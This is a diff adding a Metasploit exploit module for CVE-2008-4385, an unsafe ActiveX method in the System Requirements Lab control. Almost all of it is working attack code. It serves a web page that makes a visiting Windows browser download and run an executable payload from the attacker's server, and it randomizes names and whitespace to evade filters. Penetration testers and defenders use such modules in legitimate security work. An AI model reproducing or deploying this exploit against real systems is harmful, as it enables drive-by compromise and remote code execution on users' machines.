@@ -1,0 +1,94 @@
+##
+# $Id: systemrequirementslab_unsafe.rb 10394 2010-09-20 08:06:27Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+	include Msf::Exploit::EXE
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Husdawg, LLC. System Requirements Lab ActiveX Unsafe Method',
+			'Description'    => %q{
+					This module allows attackers to execute code via an unsafe method in
+				Husdawg, LLC. System Requirements Lab ActiveX Control (sysreqlab2.dll 2.30.0.0)
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => [ 'MC' ],
+			'Version'        => '$Revision: 10394 $',
+			'References'     =>
+				[
+					[ 'CVE', '2008-4385' ],
+					[ 'OSVDB', '50122' ],
+					[ 'US-CERT-VU', '166651' ],
+				],
+			'Payload'        =>
+				{
+					'Space'           => 2048,
+					'StackAdjustment' => -3500,
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Automatic', { } ],
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Oct 16 2008'))
+	end
+
+	def autofilter
+		false
+	end
+
+	def check_dependencies
+		use_zlib
+	end
+
+	def on_request_uri(cli, request)
+
+		payload_url =  "http://"
+		payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
+		payload_url += ":" + datastore['SRVPORT'] + get_resource() + "/payload"
+
+		if (request.uri.match(/payload/))
+			return if ((p = regenerate_payload(cli)) == nil)
+			data = generate_payload_exe({ :code => p.encoded })
+			print_status("Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...")
+			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
+			return
+		end
+
+		vname  = rand_text_alpha(rand(100) + 1)
+		exe    = rand_text_alpha(rand(20) + 1)
+
+		content = %Q|
+			<html>
+				<object classid='clsid:67A5F8DC-1A4B-4D66-9F24-A704AD929EEE' id='#{vname}'></object>
+				<script language='JavaScript'>
+					#{vname}.Init("#{payload_url}/#{exe}.exe", "#{vname}");
+				</script>
+			</html>
+						|
+
+		content = Rex::Text.randomize_space(content)
+
+		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
+
+		send_response_html(cli, content)
+
+		handler(cli)
+
+	end
+
+end
